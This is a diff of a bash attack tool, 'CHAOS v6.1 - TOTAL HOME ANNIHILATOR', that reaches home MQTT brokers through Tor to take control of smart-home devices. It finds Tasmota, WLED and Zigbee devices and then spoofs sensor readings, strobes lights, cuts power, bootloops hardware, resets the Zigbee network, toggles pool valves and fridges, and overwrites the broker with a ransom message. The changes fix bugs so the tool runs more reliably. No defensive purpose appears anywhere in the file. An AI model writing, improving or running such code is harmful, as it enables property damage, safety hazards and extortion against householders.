@@ -1,5 +1,5 @@
 #!/bin/bash
-# CHAOS v6.1 - TOTAL HOME ANNIHILATOR - FIXED BINARY GREP ERROR
+# CHAOS v6.1 - TOTAL HOME ANNIHILATOR - FIXED DISCOVERY CRASH
 set -euo pipefail
 
 # TARGET SYSTEM
@@ -10,8 +10,8 @@ TOR="torsocks"
 MAX_TEMP="50"
 MAX_HUMID="99"
 MAX_BRIGHT="255"
-CHAOS_STATUS="-TOTAL-ANNIHILATION"
-RANSOM_MSG="TRUSTEDF57- TOTAL HOME TAKEOVER "
+CHAOS_STATUS="TOTAL-ANNIHILATION"
+RANSOM_MSG="TRUSTEDF57 TOTAL HOME TAKEOVER "
 
 ENCRYPT_PAYLOAD() {
     echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-I-FUCK-MARTHA-ROOT" 2>/dev/null | sed 's/=//g'
@@ -28,26 +28,33 @@ TOR_PUB() {
 discover_all() {
     echo "[🔍] FULL DISCOVERY ${HOST}:${PORT} (45s)..."
     
-    # FIXED: Safe text filtering + binary safe
-    timeout 45 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" 2>/dev/null | \
-    strings | \
-    grep -aiE "(Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge)" 2>/dev/null | \
-    sed 's|.*/||;s|/.*||' | \
-    grep -v '^$' | \
-    sort -u > "chaos_all.txt"
+    # ULTRA SAFE DISCOVERY - NO CRASH
+    rm -f "chaos_all.txt"
+    timeout 45 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" >/dev/null 2>&1 | \
+    timeout 45 awk '
+    /Tasmota/ || /wled/ || /zigbee2mqtt/ || /temp/ || /humid/ || 
+    /Garage/ || /Garden/ || /Shed/ || /Pool/ || /Fridge/ {
+        gsub(/\/.*/, "", $1);
+        gsub(/.*\//, "", $1);
+        if ($1 != "") print $1
+    }' | \
+    sort -u > "chaos_all.txt" 2>/dev/null || true
     
-    if [[ -f "chaos_all.txt" && -s "chaos_all.txt" ]]; then
-        COUNT=$(wc -l < "chaos_all.txt")
-        echo "📋 TOTAL DEVICES: ${COUNT}"
+    # SAFE COUNT
+    if [[ -f "chaos_all.txt" ]]; then
+        COUNT=$(wc -l < "chaos_all.txt" 2>/dev/null || echo "0")
     else
-        echo "📋 TOTAL DEVICES: 0"
-        : > "chaos_all.txt"  # Create empty file
+        COUNT="0"
+        touch "chaos_all.txt"
     fi
+    
+    echo "📋 TOTAL DEVICES: ${COUNT}"
+    echo "[✅] Discovery complete - press ENTER"
 }
 
 load_all() {
     if [[ -f "chaos_all.txt" ]]; then
-        mapfile -t ALL_DEVICES < "chaos_all.txt"
+        mapfile -t ALL_DEVICES < "chaos_all.txt" 2>/dev/null || ALL_DEVICES=()
         echo "[📱] ${#ALL_DEVICES[@]} TOTAL DEVICES loaded"
         return 0
     else
@@ -62,39 +69,40 @@ show_menu() {
     COUNT=${#ALL_DEVICES[@]}
     cat << EOF
 ┌─ TRUSTEDF57 - ${HOST}:${PORT} (${COUNT} TOTAL DEVICES) ─┐
-│ 1)  FULL SYSTEM DISCOVERY (45s)                     │
-│ 2)   TEMP 50°C + 💧 HUMIDITY 99% (ALL SENSORS)      │
-│ 3)  STROBE LIGHTS + MAX BRIGHT (Tasmota/WLED)       │
-│ 4)  ALL POWER OFF                                   │
-│ 5)  ALL POWER ON + MAX 255                          │
-│ 6)  RAINBOW + MATRIX DISCO (WLED)                   │
-│ 7)  BOOTLOOP Tasmota + Zigbee Flood                 │
-│ 8)  BROKER + Z2M RANSOM OVERWRITE                   │
-│ 9)  VALVES + POOL + FRIDGE CHAOS                    │
-│ 0)  TOTAL HOME ANNIHILATION v6.1                    │
-│ X)  EXIT                                            │
+│ 1) FULL SYSTEM DISCOVERY (45s)                     │
+│ 2) TEMP 50°C + 💧 HUMIDITY 99% (ALL SENSORS)      │
+│ 3) STROBE LIGHTS + MAX BRIGHT (Tasmota/WLED)       │
+│ 4) ALL POWER OFF                                   │
+│ 5) ALL POWER ON + MAX 255                          │
+│ 6) RAINBOW + MATRIX DISCO (WLED)                   │
+│ 7) BOOTLOOP Tasmota + Zigbee Flood                 │
+│ 8) BROKER + Z2M RANSOM OVERWRITE                   │
+│ 9) VALVES + POOL + FRIDGE CHAOS                    │
+│ 0) TOTAL HOME ANNIHILATION v6.1                    │
+│ X) EXIT                                            │
 └───────────────────────────────────────────────────────┘
 EOF
 }
 
 check_loaded() {
     [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { 
-        echo "❌ No devices! Run 1) DISCOVERY"
+        echo "❌ No devices! Run 1) DISCOVERY first"
+        sleep 2
         return 1
     }
     return 0
 }
 
 max_temp_humidity() {
-    check_loaded || return
+    check_loaded || return 1
     echo "[🌡️💧] MAX TEMP 50°C + HUMIDITY 99%..."
     
     TOR_PUB "zigbee2mqtt/bridge/request/devices"
     TOR_PUB "zigbee2mqtt/#" '{"temperature": 50, "humidity": 99}'
     
     for dev in "${ALL_DEVICES[@]}"; do
-        TOR_PUB "zigbee2mqtt/${dev}/set" '{"temperature": 50, "humidity": 99}'
-        TOR_PUB "zigbee2mqtt/${dev}" '{"temperature": 50, "humidity": 99, "status": "CHAOS"}'
+        TOR_PUB "zigbee2mqtt/${dev}/set" '{"temperature": 50, "humidity": 99}' || true
+        TOR_PUB "zigbee2mqtt/${dev}" '{"temperature": 50, "humidity": 99, "status": "CHAOS"}' || true
     done
     
     TOR_PUB "climate/#" '{"temperature": 50, "humidity": 99}'
@@ -103,7 +111,7 @@ max_temp_humidity() {
 }
 
 lights_strobe_max() {
-    check_loaded || return
+    check_loaded || return 1
     echo "[💡] LIGHTS STROBE + MAX 255..."
     for dev in "${ALL_DEVICES[@]}"; do
         if [[ $dev == Tasmota* || $dev == wled* ]]; then
@@ -116,47 +124,49 @@ lights_strobe_max() {
 }
 
 power_off_all() {
-    check_loaded || return
+    check_loaded || return 1
     echo "[🔴] TOTAL POWER OFF..."
     for dev in "${ALL_DEVICES[@]}"; do
-        TOR_PUB "${dev}/cmnd/Power" "0"
-        TOR_PUB "${dev}/POWER" "OFF"
-        TOR_PUB "${dev}/set" '{"state": "OFF"}'
+        TOR_PUB "${dev}/cmnd/Power" "0" || true
+        TOR_PUB "${dev}/POWER" "OFF" || true
+        TOR_PUB "${dev}/set" '{"state": "OFF"}' || true
     done
     echo "✅ OFF"
 }
 
 power_max_all() {
-    check_loaded || return
+    check_loaded || return 1
     echo "[🟢] TOTAL POWER ON + 255..."
     for dev in "${ALL_DEVICES[@]}"; do
-        TOR_PUB "${dev}/cmnd/Power" "1"
-        TOR_PUB "${dev}/POWER" "ON"
-        TOR_PUB "${dev}/cmnd/Bri" "255"
-        TOR_PUB "${dev}/set" '{"state": "ON", "brightness": 255}'
+        TOR_PUB "${dev}/cmnd/Power" "1" || true
+        TOR_PUB "${dev}/POWER" "ON" || true
+        TOR_PUB "${dev}/cmnd/Bri" "255" || true
+        TOR_PUB "${dev}/set" '{"state": "ON", "brightness": 255}' || true
     done
     echo "✅ MAX POWER"
 }
 
 disco_chaos() {
-    check_loaded || return
+    check_loaded || return 1
     echo "[🎪] RAINBOW MATRIX DISCO..."
     disco_fx="fx 38;sx 255;ix 255;bri 255;col 255,0,255"
     for dev in "${ALL_DEVICES[@]}"; do
-        [[ $dev == wled* ]] || continue
-        TOR_PUB "wled/${dev}/backlog" "${disco_fx}"
+        if [[ $dev == wled* ]]; then
+            TOR_PUB "wled/${dev}/backlog" "${disco_fx}"
+        fi
     done
     echo "✅ Disco ON"
 }
 
 bootloop_flood() {
-    check_loaded || return
+    check_loaded || return 1
     echo "[💥] BOOTLOOP + ZIGBEE FLOOD..."
     
     bootloop="Power1;Delay 400;Power0;Delay 200;Power1;Delay 800;LOOP"
     for dev in "${ALL_DEVICES[@]}"; do
-        [[ $dev == Tasmota* ]] || continue
-        TOR_PUB "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
+        if [[ $dev == Tasmota* ]]; then
+            TOR_PUB "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
+        fi
     done
     
     TOR_PUB "zigbee2mqtt/bridge/request/network/reset" '{"force": true}'
@@ -177,7 +187,7 @@ broker_ransom() {
 }
 
 valves_pool_chaos() {
-    check_loaded || return
+    check_loaded || return 1
     echo "[🏠] POOL/VALVES/FRIDGE CHAOS..."
     
     TOR_PUB "zigbee2mqtt/Pool Valve/set" '{"state": "ON"}'
@@ -191,7 +201,7 @@ valves_pool_chaos() {
 }
 
 total_annihilation_v61() {
-    check_loaded || return
+    check_loaded || return 1
     echo "🎯 TOTAL HOME ANNIHILATION v6.1..."
     
     power_off_all
@@ -214,14 +224,14 @@ total_annihilation_v61() {
     echo "💀🏠 TOTAL ANNIHILATION COMPLETE! 💀"
 }
 
-# MAIN LOOP
+# MAIN LOOP - BULLETPROOF
 ALL_DEVICES=()
 clear
 echo "💀 CHAOS v6.1 - ${HOST}:${PORT} - TOTAL HOME DESTRUCTION"
 
 while true; do
     show_menu
-    read -r CHOICE
+    read -r -t 30 CHOICE || CHOICE=""
     case "${CHOICE}" in
         1) discover_all; load_all ;;
         2) max_temp_humidity ;;
@@ -233,9 +243,9 @@ while true; do
         8) broker_ransom ;;
         9) valves_pool_chaos ;;
         0) total_annihilation_v61 ;;
-        [Xx]) echo "EXIT CHAOS"; exit 0 ;;
-        *) echo "❌ ${CHOICE} invalido" ;;
+        [Xx]|[Qq]) echo "EXIT CHAOS"; exit 0 ;;
+        *) echo "❌ ${CHOICE} invalido - try 1 for discovery" ;;
     esac
     echo
-    read -p "⏸️  ENTER per continuare..."
+    read -p "⏸️  ENTER per continuare... (or X to exit)" || true
 done
